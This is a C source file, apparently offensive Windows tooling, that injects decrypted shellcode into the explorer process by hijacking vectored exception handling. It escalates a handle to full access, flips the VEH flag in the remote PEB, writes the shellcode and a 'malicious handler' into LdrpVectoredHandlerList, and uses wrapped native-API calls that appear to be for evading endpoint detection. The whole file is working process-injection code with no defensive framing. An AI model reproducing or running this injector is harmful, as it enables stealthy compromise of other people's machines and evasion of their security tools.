typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(IN HANDLE ProcessHandle, IN int ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);
typedef HRESULT(WINAPI* pRtlEncodeRemotePointer)(_In_ HANDLE ProcessToken, _In_opt_ PVOID Ptr, _Out_ PVOID* EncodedPtr);

//Get address and size of a section within NTDLL (via LdrGetDllHandle)
BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize) {
	PVOID hNtdll = NULL;
	UNICODE_STRING usNtdll;
	RtlInitUnicodeString(&usNtdll, L"ntdll.dll");
	NTSTATUS status = LdrGetDllHandle(NULL, NULL, &usNtdll, &hNtdll);
	if (hNtdll == NULL) return FALSE;

	PIMAGE_DOS_HEADER ntdllDos = (PIMAGE_DOS_HEADER)hNtdll;
	PIMAGE_NT_HEADERS ntdllNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + ntdllDos->e_lfanew);
	for (WORD i = 0; i < ntdllNt->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntdllNt) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)sectionHeader->Name, sectionName)) {
			*sectionVa = (PVOID)((ULONG_PTR)hNtdll + sectionHeader->VirtualAddress);
			*sectionSize = sectionHeader->Misc.VirtualSize;
		}
	}

	return TRUE;

}

//Taken from here: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
PVOID findLdrpVectorHandlerList(PVOID VEH)
{
	BOOL found = FALSE;

	if (VEH == NULL)
		return NULL;

	PLIST_ENTRY next = ((PLIST_ENTRY)VEH)->Flink;

	PVOID sectionVa;
	DWORD sectionSz;
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	if (GetNtdllSectionVa(".data", &sectionVa, &sectionSz))
	{
		while ((PVOID)next != VEH)
		{
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID)((ULONG_PTR)sectionVa + sectionSz)) {
				break;
			}
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID*)sectionVa + sectionSz)
			{
				found = TRUE;
				break;
			}
			next = next->Flink;
		}
	}

	return found ? next : NULL;
}

//Enable the ProcessUsingVEH bit in the CrossProcessFlags member of the remote process PEB
//Returns the ImageBaseAddress if successful
LPVOID EnableRemoteVEH(HANDLE hProcess) {
	PROCESS_BASIC_INFORMATION processInfo = { 0 };
	ULONG returnLength = 0;
	SFNtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInfo, sizeof(processInfo), &returnLength);
	if (returnLength == 0) {
		#ifdef DEBUG
		printf("[-] NtQueryInformationProcess failed\n");
		#endif
		return NULL;
	}
	//Read the PEB from the remote process
	PEB2 peb_copy;
	SIZE_T bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
	if (bytesRead == 0) {
		#ifdef DEBUG
		printf("[-] NtReadVirtualMemory(PEB) failed\n");
		#endif
		return NULL;
	}
	//Enable VEH in our local copy and write it to the remote process
	peb_copy.u2.CrossProcessFlags = 0x4;
	SIZE_T bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesWritten);
	if (bytesWritten == 0) {
		#ifdef DEBUG
		printf("[-] NtWriteVirtualMemory(PEB) failed\n");
		#endif
		return NULL;
	}
	//Reread the remote PEB to ensure that we did enable VEH
	bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
	if (bytesRead == 0) {
		#ifdef DEBUG
		printf("[-] NtReadVirtualMemory(PEB, verify) failed\n");
		#endif
		return NULL;
	}
	if (peb_copy.u2.CrossProcessFlags & 0x4) {
		#ifdef DEBUG
		printf("Enabled VEH in the remote process!\n");
		#endif
		return peb_copy.ImageBaseAddress;
	}
	else {
		#ifdef DEBUG
		printf("[-] Failed to enable VEH in the remote process\n");
		#endif
	}
	return NULL;

}

int main() {
	NTSTATUS status;
	PVOID VEH = AddVectoredExceptionHandler(1, ExceptionHandler); // GalaxyGate VEH

	DWORD ProcessPid = ConvertProcNameToPid(L"plor"); // 即explorer

	HANDLE hProcess = 0;
	HANDLE hProcessLowPriv = 0;
	CLIENT_ID clientId = { (HANDLE)ProcessPid, 0 };
	OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
	SFNtOpenProcess(&hProcessLowPriv, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);
	hProcess = ElevateHandle(hProcessLowPriv, PROCESS_ALL_ACCESS, OBJ_INHERIT);
	if (hProcess == 0) {
		#ifdef DEBUG
		printf("[-] 句柄权限提升失败\n");
		#endif
		while (TRUE);
	}

	unsigned char* shellcode = shellcode_decrypt(encrypted_shellcode, sizeof(encrypted_shellcode));
	SIZE_T shellcodeSize = sizeof(encrypted_shellcode);

	DWORD sectionSize;
	PVOID sectionVa;
	GetNtdllSectionVa(".mrdata", &sectionVa, &sectionSize);

	//Get the address of the Vectored Handler List in our local process, since it should be the same in the remote process
	PVOID LdrpVectoredHandlerList = findLdrpVectorHandlerList(VEH);

	//Enable the remote VEH, this will also return the imageBaseAddress value from the PEB
	LPVOID imageBaseAddress = EnableRemoteVEH(hProcess);

	// 写入Shellcode
	ULONG oldProtect = 0;
	LPVOID shellcodeAddress = NULL;
	SIZE_T shellcodeRegion = shellcodeSize;
	SFNtAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeRegion, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	#ifdef DEBUG
	printf("[*] Remote shellcode address: %p\n", shellcodeAddress);
	#endif
	SIZE_T bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, shellcodeAddress, shellcode, shellcodeSize, &bytesWritten);

	PVOID protectBase = shellcodeAddress;
	SIZE_T protectSize = shellcodeSize;
	SFNtProtectVirtualMemory(hProcess, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);

	//Encode the pointer to our shellcode in the context of the remote process via ntdll
	PVOID encodedShellcodePointer = NULL;
	PVOID ntdllBase = NULL;
	UNICODE_STRING usNtdll;
	RtlInitUnicodeString(&usNtdll, L"ntdll.dll");
	status = LdrGetDllHandle(NULL, NULL, &usNtdll, &ntdllBase);
	ANSI_STRING asFunc;
	RtlInitAnsiString(&asFunc, "RtlEncodeRemotePointer");
	typedef NTSTATUS(NTAPI* PRtlEncodeRemotePointer)(HANDLE ProcessHandle, PVOID Ptr, PVOID* EncodedPtr);
	PRtlEncodeRemotePointer pRtlEncodeRemotePointer = NULL;
	status = LdrGetProcedureAddress(ntdllBase, &asFunc, 0, (PVOID*)&pRtlEncodeRemotePointer);
	status = pRtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer);

	//Allocate our VEH and set the pointer to our encoded pointer
	PVECTXCPT_CALLOUT_ENTRY maliciousHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY));
	maliciousHandler->VectoredHandler = encodedShellcodePointer;

	//Read the LdrpVectoredHandlerList from the remote process
	//For a suspended process this shouldn't have any entries in it
	PLIST_ENTRY firstEntry = (PLIST_ENTRY)malloc(sizeof(LIST_ENTRY));
	SIZE_T bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesRead);

	//Set our malicious handler so that the Flink/Blink point to the remote VEH ListHead
	((PLIST_ENTRY)maliciousHandler)->Flink = firstEntry->Flink;
	((PLIST_ENTRY)maliciousHandler)->Blink = firstEntry->Blink;

	//Allocate a ref value in the remote process and set it to a valid value
	PVOID refAddress = NULL;
	SIZE_T refRegion = sizeof(ULONG);
	SFNtAllocateVirtualMemory(hProcess, &refAddress, 0, &refRegion, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	ULONG ref = 1;
	bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, refAddress, &ref, sizeof(ULONG), &bytesWritten);

	//Update our local VEH with the address
	maliciousHandler->reserved = refAddress;

	//Write our local VEH into the remote process
	PVOID remoteHandlerAddress = NULL;
	SIZE_T calloutSize = sizeof(VECTXCPT_CALLOUT_ENTRY);
	SFNtAllocateVirtualMemory(hProcess, &remoteHandlerAddress, 0, &calloutSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, remoteHandlerAddress, maliciousHandler, calloutSize, &bytesWritten);

	//Change our copied LIST_HEAD for the remote process to point at our new remote handler
	firstEntry->Blink = remoteHandlerAddress;
	firstEntry->Flink = remoteHandlerAddress;

	//Unprotect the .mrdata section, write the VEH list in the remote process, and reprotect .mrdata
	PVOID mrdataBase = sectionVa;
	SIZE_T mrdataSize = sectionSize;
	ULONG mrdataOldProtect = 0;
	SFNtProtectVirtualMemory(hProcess, &mrdataBase, &mrdataSize, PAGE_READWRITE, &mrdataOldProtect);

	bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesWritten);

	mrdataBase = sectionVa;
	mrdataSize = sectionSize;
	SFNtProtectVirtualMemory(hProcess, &mrdataBase, &mrdataSize, mrdataOldProtect, &oldProtect);

	#ifdef DEBUG
	printf("[+] 注入完成\n");
	#endif
	return 0;
}

